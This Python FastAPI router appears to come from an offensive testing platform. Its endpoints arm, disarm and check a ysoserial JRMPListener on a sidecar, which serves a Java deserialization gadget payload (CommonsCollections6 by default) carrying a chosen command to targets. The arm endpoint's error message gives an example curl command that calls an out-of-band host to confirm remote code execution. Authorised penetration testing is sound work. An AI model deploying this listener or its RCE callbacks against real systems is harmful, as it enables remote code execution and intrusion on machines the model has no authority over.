"""JRMP listener management — arm/disarm ysoserial JRMPListener via sidecar."""
from __future__ import annotations

import httpx
from fastapi import APIRouter, Depends, HTTPException

from .auth.deps import current_user
from .config import get_settings
from .models import User

router = APIRouter(prefix="/api/jrmp", tags=["jrmp"])


@router.post("/arm")
async def arm(
    chain: str = "CommonsCollections6",
    cmd: str = "",
    port: int = 10099,
    user: User = Depends(current_user),
) -> dict:
    """Start ysoserial JRMPListener on the sidecar, ready to serve one gadget payload.

    arm it before sending ysoserial_jrmp_client payload to a target.
    """
    if not cmd:
        raise HTTPException(400, "cmd is required (e.g. curl http://oob_host:8010/callback/http/TOKEN/rce)")
    settings = get_settings()
    async with httpx.AsyncClient(timeout=15) as cli:
        r = await cli.post(
            f"{settings.sidecar_url}/jrmp/start",
            params={"port": port, "chain": chain, "cmd": cmd},
        )
    if r.status_code != 200:
        raise HTTPException(502, f"sidecar /jrmp/start failed: {r.text[:300]}")
    return r.json()


@router.post("/disarm")
async def disarm(user: User = Depends(current_user)) -> dict:
    """Stop the running JRMPListener."""
    settings = get_settings()
    async with httpx.AsyncClient(timeout=10) as cli:
        r = await cli.post(f"{settings.sidecar_url}/jrmp/stop")
    if r.status_code == 200:
        return r.json()
    return {"status": "error", "detail": r.text[:200]}


@router.get("/status")
async def status(user: User = Depends(current_user)) -> dict:
    """Check if JRMPListener is currently running."""
    settings = get_settings()
    try:
        async with httpx.AsyncClient(timeout=5) as cli:
            r = await cli.get(f"{settings.sidecar_url}/jrmp/status")
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {"running": False}
